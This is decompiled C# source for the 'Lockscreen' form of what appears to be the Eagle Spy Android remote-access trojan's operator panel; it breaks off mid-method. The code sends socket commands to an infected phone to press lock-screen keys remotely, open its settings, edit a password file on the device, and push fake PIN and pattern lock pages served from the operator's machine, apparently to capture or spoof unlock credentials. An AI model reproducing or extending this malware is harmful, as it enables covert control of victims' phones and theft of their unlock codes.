using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;

namespace Eaglespy
{
	// Token: 0x020000F1 RID: 241
	public partial class Lockscreen : Form
	{
		// Token: 0x06000C09 RID: 3081 RVA: 0x0010FA98 File Offset: 0x0010DC98
		public Lockscreen()
		{
			this.InitializeComponent();
			this.timer.Interval = this.interval;
			this.timer.Tick += this.timer1_Tick;
		}

		// Token: 0x06000C0A RID: 3082 RVA: 0x0010FAFC File Offset: 0x0010DCFC
		private void button1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C0B RID: 3083 RVA: 0x0010FC20 File Offset: 0x0010DE20
		private void Replacelockpin()
		{
			string text = "C:\\Programs\\Files\\lock\\pin.html";
			string text2 = "<h1>" + this.guna2TextBox2.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 141)
				{
					array[140] = text2;
					File.WriteAllLines(text, array);
					EagleAlert.ShowSucess("Success");
				}
				else
				{
					EagleAlert.ShowError("Error");
				}
			}
			catch (Exception)
			{
				EagleAlert.ShowError("Error");
			}
		}

		// Token: 0x06000C0C RID: 3084 RVA: 0x0010FCA4 File Offset: 0x0010DEA4
		private void Replacelockpattern()
		{
			string text = "C:\\Programs\\Files\\lock\\pattern.html";
			string text2 = "<h1>" + this.guna2TextBox1.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 107)
				{
					array[106] = text2;
					File.WriteAllLines(text, array);
					EagleAlert.ShowSucess("Success");
				}
				else
				{
					EagleAlert.ShowError("Error");
				}
			}
			catch (Exception)
			{
				EagleAlert.ShowError("Error");
			}
		}

		// Token: 0x06000C0D RID: 3085 RVA: 0x0010FD24 File Offset: 0x0010DF24
		private void sButton1_Click(object sender, EventArgs e)
		{
			string text = "/storage/emulated/0/Config/sys/apps/loge/pwd.text";
			if (!string.IsNullOrEmpty(text) && this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.editor,
						Data.SPL_SOCKET,
						"edit",
						Data.SPL_DATA,
						text
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000C0E RID: 3086 RVA: 0x0010FDF4 File Offset: 0x0010DFF4
		private void drakeUIButtonIcon8_Click(object sender, EventArgs e)
		{
			this.Replacelockpin();
			try
			{
				string text = "C:\\Programs\\Files\\lock\\pin.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000C0F RID: 3087 RVA: 0x0010FF44 File Offset: 0x0010E144
		private void OpenSettings()
		{
			string text = "com.android.settings";
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".apps",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"open",
						Data.SPL_DATA,
						text
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000C10 RID: 3088 RVA: 0x0011000C File Offset: 0x0010E20C
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.ip.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000C11 RID: 3089 RVA: 0x00110088 File Offset: 0x0010E288
		private void drakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			this.Replacelockpattern();
			string text = "pattern>http://" + this.ip.Text + ":8081/lock/pattern.html>com.android.settings>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					this.OpenSettings();
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C12 RID: 3090 RVA: 0x001101E8 File Offset: 0x0010E3E8
		private void drakeUIButtonIcon6_Click(object sender, EventArgs e)
		{
			string text = "pattern";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000C13 RID: 3091 RVA: 0x001102FC File Offset: 0x0010E4FC
		private void LockKey0()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK0",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C14 RID: 3092 RVA: 0x00110420 File Offset: 0x0010E620
		private void LockKey1()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK1",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C15 RID: 3093 RVA: 0x00110544 File Offset: 0x0010E744
		private void LockKey2()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK2",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C16 RID: 3094 RVA: 0x00110668 File Offset: 0x0010E868
		private void LockKey3()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK3",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C17 RID: 3095 RVA: 0x0011078C File Offset: 0x0010E98C
		private void LockKey4()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK4",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C18 RID: 3096 RVA: 0x001108B0 File Offset: 0x0010EAB0
		private void LockKey5()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK5",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C19 RID: 3097 RVA: 0x001109D4 File Offset: 0x0010EBD4
		private void LockKey6()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK6",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C1A RID: 3098 RVA: 0x00110AF8 File Offset: 0x0010ECF8
		private void LockKey7()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK7",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C1B RID: 3099 RVA: 0x00110C1C File Offset: 0x0010EE1C
		private void LockKey8()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK8",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C1C RID: 3100 RVA: 0x00110D40 File Offset: 0x0010EF40
		private void LockKey9()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LK9",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C1D RID: 3101 RVA: 0x00110E64 File Offset: 0x0010F064
		private void LKAP()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKAP",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C1E RID: 3102 RVA: 0x00110F88 File Offset: 0x0010F188
		private void LKWX()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKWX",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C1F RID: 3103 RVA: 0x001110AC File Offset: 0x0010F2AC
		private void LKSBU()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKSBU",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C20 RID: 3104 RVA: 0x001111D0 File Offset: 0x0010F3D0
		private void LKKBU()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKKBU",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C21 RID: 3105 RVA: 0x001112F4 File Offset: 0x0010F4F4
		private void LKOS()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKOS",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C22 RID: 3106 RVA: 0x00111418 File Offset: 0x0010F618
		private void LKSDU()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKSDU",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C23 RID: 3107 RVA: 0x0011153C File Offset: 0x0010F73C
		private void LKKDU()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKKDU",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C24 RID: 3108 RVA: 0x00111660 File Offset: 0x0010F860
		private void LKnn()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKnn",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C25 RID: 3109 RVA: 0x00111784 File Offset: 0x0010F984
		private void LKen()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKen",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C26 RID: 3110 RVA: 0x001118A8 File Offset: 0x0010FAA8
		private void LKeb()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKeb",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C27 RID: 3111 RVA: 0x001119CC File Offset: 0x0010FBCC
		private void LKde()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKde",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C28 RID: 3112 RVA: 0x00111AF0 File Offset: 0x0010FCF0
		private void LKej()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>LKej",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C29 RID: 3113 RVA: 0x00111C14 File Offset: 0x0010FE14
		private void en()
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>En",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000C2A RID: 3114 RVA: 0x0000767F File Offset: 0x0000587F
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			this.LKAP();
		}

		// Token: 0x06000C2B RID: 3115 RVA: 0x00007687 File Offset: 0x00005887
		private void guna2GradientCircleButton1_Click(object sender, EventArgs e)
		{
			this.LockKey1();
		}

		// Token: 0x06000C2C RID: 3116 RVA: 0x0000768F File Offset: 0x0000588F
		private void guna2GradientCircleButton2_Click(object sender, EventArgs e)
		{
			this.LockKey2();
		}

		// Token: 0x06000C2D RID: 3117 RVA: 0x00007697 File Offset: 0x00005897
		private void guna2GradientCircleButton3_Click(object sender, EventArgs e)
		{
			this.LockKey3();
		}

		// Token: 0x06000C2E RID: 3118 RVA: 0x0000769F File Offset: 0x0000589F
		private void guna2GradientCircleButton6_Click(object sender, EventArgs e)
		{
			this.LockKey4();
		}

		// Token: 0x06000C2F RID: 3119 RVA: 0x000076A7 File Offset: 0x000058A7
		private void guna2GradientCircleButton5_Click(object sender, EventArgs e)
		{
			this.LockKey5();
		}

		// Token: 0x06000C30 RID: 3120 RVA: 0x000076AF File Offset: 0x000058AF
		private void guna2GradientCircleButton4_Click(object sender, EventArgs e)
		{
